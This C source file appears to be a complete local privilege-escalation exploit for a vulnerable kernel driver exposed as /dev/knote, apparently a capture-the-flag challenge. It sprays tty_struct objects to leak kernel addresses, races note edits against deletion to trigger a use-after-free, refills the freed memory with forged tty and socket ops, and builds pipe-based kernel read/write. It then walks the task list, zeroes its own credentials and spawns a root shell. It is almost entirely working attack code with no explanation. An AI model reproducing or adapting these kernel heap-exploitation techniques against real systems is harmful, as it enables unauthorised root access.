#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pty.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <errno.h>
#include <sys/prctl.h>

#include "exploit.h"

#define BEFORE_NUM 8000
#define AFTER_NUM 8000
#define REFILL_NUM 100
#define ALLOC_NUM 128
#define MSG_NUM 256
#define STRUCT_LEN (0x58 - 0x30)
unsigned long spray[BEFORE_NUM + AFTER_NUM];
unsigned long spray2[REFILL_NUM];
unsigned long vuln;
int fd;
struct 
{ 
	long mtype;
	char mtext[STRUCT_LEN];
} msg = {0x4141414141414141, {0}};
int msqid;
char comm[] = "m3m3d4d4";

int readmem(const void *src, void *dest, size_t count)
{
	int pipefd[2];
	int len;

	pipe(pipefd);

	len = write(pipefd[1], src, count);

	if (len != count) {
		printf("[-] fail read at %p : %d %d\n", src, (int)len, errno);
		exit(1);
	}

	read(pipefd[0], dest, count);

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

int writemem(void *dest, const void *src, size_t count)
{
	int pipefd[2];
	int len;

	pipe(pipefd);

	write(pipefd[1], src, count);
	len = read(pipefd[0], dest, count);

	if (len != count) {
		printf("[-] fail write at %p : %d %d\n", dest, (int)len, errno);
		exit(1);
	}

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

void getroot(unsigned long cred)
{
    unsigned int i;
	char nulls[32];
	
	memset(nulls, 0, sizeof(nulls));
	writemem((void *)(cred + 4), &nulls, 32);
}

unsigned long add_note(int fd, unsigned long year, unsigned long month, unsigned long day,
		unsigned long h, unsigned long m, unsigned long s,
		void *buf, unsigned long size) {
	struct note_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.buf_size = size;
	io.buf = buf;

	ret = ioctl(fd, NOTE_ADD, &io);
	if (ret < 0) {
		printf("[-] add note failed\n");
		exit(1);
	}

	return *(unsigned long *)(&io);
}

int delete_note(int fd, unsigned long year, unsigned long month, unsigned long day, unsigned long h, unsigned long m, unsigned long s, unsigned long magic) {
	struct delete_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.magic = magic;

	ret = ioctl(fd, NOTE_DELETE, &io);
	if (ret < 0) {
		printf("[-] delete note failed\n");
		exit(1);
	}

	return ret;
}

int read_note(int fd, unsigned long year, unsigned long month, unsigned long day, unsigned long h, unsigned long m, unsigned long s, unsigned long magic, unsigned long size, void *buf) {
	struct read_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.magic = magic;
	io.buf_size = size;
	io.buf = buf;

	ret = ioctl(fd, NOTE_READ, &io);
	if (ret < 0) {
		printf("[-] read note failed\n");
	//	exit(1);
	}
	return ret;
}

int edit_time(int fd, unsigned long year, unsigned long month, unsigned long day, unsigned long h, unsigned long m, unsigned long s, unsigned long new_year, unsigned long new_month, unsigned long new_day, unsigned long new_h, unsigned long new_m, unsigned long new_s, unsigned long magic) {
	struct time_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.magic = magic;

	io.new_date.year = new_year;
	io.new_date.month = new_month;
	io.new_date.day = new_day;
	io.new_date.h = new_h;
	io.new_date.m = new_m;
	io.new_date.s = new_s;

	io.cmd = EDIT_TIME;

	ret = ioctl(fd, NOTE_EDIT, &io);
	if (ret < 0) {
		printf("[-] edit time failed\n");
		exit(1);
	}
	return ret;
}

int edit_buf(int fd, unsigned long year, unsigned long month, unsigned long day, unsigned long h, unsigned long m, unsigned long s, unsigned long magic, unsigned long size, void *buf) {
	struct buf_io_t io;
	int ret;

	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.magic = magic;
	io.buf_size = size;
	io.buf = buf;

	io.cmd = EDIT_NOTE;

	ret = ioctl(fd, NOTE_EDIT, &io);
	if (ret < 0) {
		printf("[-] edit note failed\n");
		exit(1);
	}

	return ret;
}

int list(int fd) {
	int ret;

	ret = ioctl(fd, NOTE_LIST, 0);
	if (ret < 0) {
		printf("[-] list note failed\n");
		exit(1);
	}

	return ret;
}

void racing(void) {
	int i;
	unsigned long year = 2017, month = 1, day = 1;
	unsigned long h = 1, m = 1, s = 2;

	delete_note(fd, year, month, day, h, m, s, vuln);

	for (i = 0; i < MSG_NUM; i++) {
		if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
			puts("msgsnd");
            exit(1);
        }
    }

	while(1) {
		sleep(10);
	}
}

int main()
{
	int i, j, ret;
	int corrupted_i;
	int m_fd[ALLOC_NUM], s_fd[ALLOC_NUM];

	pthread_t pt;

	unsigned long year, month, day;
	unsigned long h, m, s, new_s;
	char buf[BUFFER_SIZE];
	unsigned long size;
	unsigned long link = 0, controlled = 0, ops;

	struct tty_struct_header *refill;
	unsigned long kernel_text, kernel_base, jmp_addr1, jmp_addr2;
	unsigned long cur, offset, init_task, cred, real_cred;
	char task_buf[BUFFER_SIZE * 2];
	void *tty_ops[64];
	char scratch[1024];

	void *sock_ops[16];

	puts("[+] let's start :)");

	puts("[+] setting comm");
	ret = prctl(PR_SET_NAME, comm);
	if (ret < 0) {
		puts("[-] fail to set comm");
		exit(1);
	}

	puts("[+] open device");
	fd = open("/dev/knote", O_RDWR);
	if (fd < 0) {
		puts("[-] device open failed");
		exit(1);
	}

	/* tty spraying */
	puts("[+] spraying tty_struct");
	for (i = 0; i < ALLOC_NUM; ++i) {
		if (openpty(&m_fd[i], &s_fd[i], NULL, NULL, NULL) == -1) {
			puts("[-] pty creation failed");
			exit(1);
		}
	}

	for (i = 0; i < ALLOC_NUM; i += 2) {
		close(m_fd[i]);
		close(s_fd[i]);
	}

	puts("[+] spraying notes on the same day");
	year = 2017; month = 1; day = 1;
	h = 1; m = 1, s = 1;
	size = 0;
	for (i = 0; i < BEFORE_NUM; i++) {
		spray[i] = add_note(fd, year, month, day, h, m, s, &buf, size);			
	}

	/* tty offset: ops 0x00000018, link 0x00000218, name 0x00000190 */ 
	for (i = 0; i < BEFORE_NUM; i++) {
		read_note(fd, year, month, day, h, m, s, spray[i], BUFFER_SIZE, &buf);
		if (*(char *)(buf + 0x190) == 'p'
		&& *(char *)(buf + 0x191) == 't'
		&& *(char *)(buf + 0x192) == 's') {
			link = *(unsigned long *)(buf + 0x218);
			ops = *(unsigned long *)(buf + 0x18);
			printf("[+] i: %d leaked link addr: 0x%08lx leaked pc: 0x%08lx\n", i, link, ops);
			break;
		}
	}
	
	if (!link) {
		puts("[-] leaking failed");
		exit(1);
	}

	read_note(fd, year, month, day, h, m, s, spray[i + 1], BUFFER_SIZE, &buf);
	if (*(char *)(buf + 0x190) != 'p'
	|| *(char *)(buf + 0x191) != 't'
	|| *(char *)(buf + 0x192) != 'm') 
		puts("[-] fengshui failed");
	controlled = *(unsigned long *)(buf + 0x218);
	printf("[+] controlled addr: 0x%08lx\n", controlled);

	year = 2017; month = 1; day = 1;
	h = 1; m = 1, s = 2;
	size = 0;
	vuln = add_note(fd, year, month, day, h, m, s, &buf, size);
	printf("vuln magic: 0x%08lx\n", vuln);

	s = 1;
	for (i = 0; i < AFTER_NUM; i++) {
		spray[i + BEFORE_NUM] = add_note(fd, year, month, day, h, m, s, &buf, size);
	}

	puts("[+] preparing msg for re-filling");
	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
		puts("[-] msgget error");
        exit(1);
	}		

	*(unsigned long *)(&msg.mtext[(0x38 - 0x30)]) = vuln;
	*(unsigned long *)(&msg.mtext[(0x40 - 0x30)]) = link;
	*(unsigned long *)(&msg.mtext[(0x48 - 0x30)]) = 0x0; // next
	*(unsigned long *)(&msg.mtext[(0x50 - 0x30)]) = 0x0; // pprev

	pthread_create(&pt, NULL, (void *)racing, NULL);

	s = 2;
	new_s = 1;
	edit_time(fd, year, month, day, h, m, s, year, month, day, h, m, new_s, vuln);

	puts("[+] racing ends");

	delete_note(fd, year, month, day, h, m, new_s, vuln);

	s = 1;
	for (i = 0; i < BEFORE_NUM; i++) {
		ret = read_note(fd, year, month, day, h, m, s, spray[i], 0x0, &buf);
		if (ret < 0) {
			printf("[+] corrupted note i: %d\n", i);
			break;
		}
	}
	corrupted_i = i;

	for (i = 0; i < ALLOC_NUM; i += 2) {
		if (openpty(&m_fd[i], &s_fd[i], NULL, NULL, NULL) == -1) {
			puts("[-] pty creation failed");
			exit(1);
		}
	}
	
	delete_note(fd, year, month, day, h, m, s, spray[corrupted_i]);

/*
   .text:FFFFFFFF81452180                 add     rsp, 8
   .text:FFFFFFFF81452184                 pop     rbx
   .text:FFFFFFFF81452185                 pop     rbp
   .text:FFFFFFFF81452186                 retn

.text:FFFFFFFF8172A370                 call    nullsub_1
.text:FFFFFFFF8172A375
.text:FFFFFFFF8172A375 ; =============== S U B R O U T I N E =======================================
.text:FFFFFFFF8172A375
.text:FFFFFFFF8172A375 ; Attributes: bp-based frame
.text:FFFFFFFF8172A375
.text:FFFFFFFF8172A375 sub_FFFFFFFF8172A375 proc near
.text:FFFFFFFF8172A375                 push    rbp
.text:FFFFFFFF8172A376                 mov     rax, gs:off_D380
.text:FFFFFFFF8172A37F                 cmp     esi, 1
.text:FFFFFFFF8172A382                 mov     rbp, rsp
.text:FFFFFFFF8172A385                 push    rbx
.text:FFFFFFFF8172A386                 mov     rbx, [rax+0AE0h]
.text:FFFFFFFF8172A38D                 mov     qword ptr [rax+0AE0h], 0FFFFFFFFFFFFFFFFh
.text:FFFFFFFF8172A398                 jz      short loc_FFFFFFFF8172A3B4
.text:FFFFFFFF8172A39A                 mov     rax, [rdi+28h]
.text:FFFFFFFF8172A39E                 call    qword ptr [rax+68h]
.text:FFFFFFFF8172A3A1
.text:FFFFFFFF8172A3A1 loc_FFFFFFFF8172A3A1:                   ; CODE XREF: sub_FFFFFFFF8172A375+44j
.text:FFFFFFFF8172A3A1                 mov     rdx, gs:off_D380
.text:FFFFFFFF8172A3AA                 mov     [rdx+0AE0h], rbx
.text:FFFFFFFF8172A3B1                 pop     rbx
.text:FFFFFFFF8172A3B2                 pop     rbp
.text:FFFFFFFF8172A3B3                 retn
 
*/

	refill = (struct tty_struct_header *)malloc(1024);	
	refill->magic = TTY_MAGIC;
	refill->kref.refcount.counter = 0x1337;
	refill->dev = scratch;
	refill->driver = scratch;
	refill->ops = tty_ops;
	*(unsigned long *)((char *)refill + 0x28) = (unsigned long)sock_ops;

	kernel_text = ops - 0xa7b8e0;
	printf("[+] kernel base: 0x%08lx\n", kernel_text);
	jmp_addr1 = kernel_text + 0x72a370;
	jmp_addr2 = kernel_text + 0x452180;


	for (i = 0; i < 64; i++)
		tty_ops[i] = (void *)jmp_addr1;

	for (i = 0; i < 16; i++)
		sock_ops[i] = (void *)jmp_addr2;

	s = 3; size = BUFFER_SIZE; 
	for (i = 0; i < REFILL_NUM; i++) {
		spray2[i] = add_note(fd, year, month, day, h, m, s, refill, size);
	}

	for (i = 0; i < ALLOC_NUM; i += 2) {
		ioctl(m_fd[i], 0xdeadbeef);
		ioctl(s_fd[i], 0xdeadbeef);
	}

	cur = init_task = kernel_text + 0xe0d540; 
	/* task offset: tasks 0x00000398, comm 0x00000648, cred 0x00000640 */
	while(1) {
		printf("[+] trying: 0x%08lx\n", cur);
		readmem((void *)cur, &task_buf, BUFFER_SIZE * 2);	
		offset = (unsigned long)memmem(task_buf, BUFFER_SIZE * 2, comm, strlen(comm));
		if (offset) {
			printf("[+] find comm: %s\n", (char *)offset);
			break;
		}
		cur = *(unsigned long *)(task_buf + 0x398) - 0x398;
		if (cur == init_task)
			break;
	}
	real_cred = *(unsigned long *)(task_buf + 0x638);
	cred = *(unsigned long *)(task_buf + 0x640);
	printf("[+] real cred: 0x%08lx\n", real_cred);
	printf("[+] cred: 0x%08lx\n", cred);

	getroot(real_cred);
	getroot(cred);	

	if (getuid() != 0) {
		puts("[-] fail to get root!");
		exit(1);
	}

	puts("[+] enjoy the root shell");
	execl("/bin/sh", "sh", NULL);

	return 0;
}


